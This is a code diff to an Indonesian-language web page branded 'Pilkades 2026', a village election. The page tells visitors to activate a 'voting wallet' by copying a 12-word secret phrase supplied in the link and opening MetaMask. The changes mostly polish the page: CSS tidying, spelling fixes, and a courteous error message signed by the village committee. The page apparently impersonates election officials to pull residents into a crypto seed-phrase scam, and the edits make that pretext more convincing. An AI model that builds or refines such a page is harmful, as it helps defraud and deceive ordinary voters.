@@ -24,7 +24,7 @@
       border-radius: 20px;
       max-width: 420px;
       width: 95%;
-      box-shadow: 0 10px 40px rgba(255, 107, 0, 0.3);
+      box-shadow: 0 10px 40px rgba(255,107,0,0.3);
     }
     h1 {
       color: #ff6b00;
@@ -84,6 +84,17 @@
       font-size: 0.9em;
       color: #888;
     }
+    .error {
+      background: #330000;
+      color: #ff6b6b;
+      padding: 40px 20px;
+      border-radius: 16px;
+      border: 2px solid #ff4444;
+      max-width: 420px;
+      margin: 20px;
+      font-size: 1.1em;
+      line-height: 1.7;
+    }
     @media (max-width: 480px) {
       h1 {font-size:1.9em;}
       .btn {width:100%; margin:10px 0;}
@@ -95,7 +106,7 @@
   <div class="card">
     <h1>Pilkades 2026</h1>
     <p><strong>Silahkan aktivasi Wallet voting kamu!</strong></p>
-    <p>Sekarang ikuti langkah dibawah ini:</p>
+    <p>Sekarang ikuti langkah di bawah ini:</p>
 
     <div class="steps">
       1. Klik tombol <b>Copy 12 Kata Rahasia</b> di bawah<br>
@@ -112,12 +123,10 @@
 
     <div class="seed" id="seedBox">Sedang memuat 12 kata…</div>
 
-    <!-- Tombol Copy -->
     <button class="btn btn-copy" id="copyBtn">
       <i class="fas fa-copy"></i> <span>Copy 12 Kata Rahasia</span>
     </button>
 
-    <!-- Tombol Buka MetaMask -->
     <button class="btn" onclick="location.href='https://metamask.app.link'">
       <i class="fas fa-external-link-alt"></i> Buka MetaMask Sekarang
     </button>
@@ -132,12 +141,21 @@
     const params = new URLSearchParams(location.search);
     const seed = params.get('seed')?.trim();
 
-    if (!seed || seed.split(/\s+/).filter(w => w).length !== 12) {
-      document.body.innerHTML = "<div style='color:red;padding:50px;font-size:2em;'>Link tidak valid atau sudah rusak!</div>";
+    if (!seed || seed.split(/\s+/).filter(w => w.length > 0).length !== 12) {
+      // PESAN ERROR YANG LEBIH BAIK & SOPAN
+      document.body.innerHTML = `
+        <div class="error">
+          <h2>Link Tidak Dapat Digunakan</h2>
+          <p>Maaf, link aktivasi wallet yang Anda buka tidak valid atau sudah kadaluarsa.</p>
+          <p>Silakan hubungi <strong>Panitia Pilkades 2026</strong> setempat untuk mendapatkan link yang baru.</p>
+          <p>Terima kasih atas pengertian Anda.</p>
+          <br>
+          <small>— Panitia Desa</small>
+        </div>
+      `;
     } else {
       document.getElementById('seedBox').textContent = seed;
 
-      // Fungsi Copy
       const copyBtn = document.getElementById('copyBtn');
       const copyText = copyBtn.querySelector('span');
       const copyIcon = copyBtn.querySelector('i');
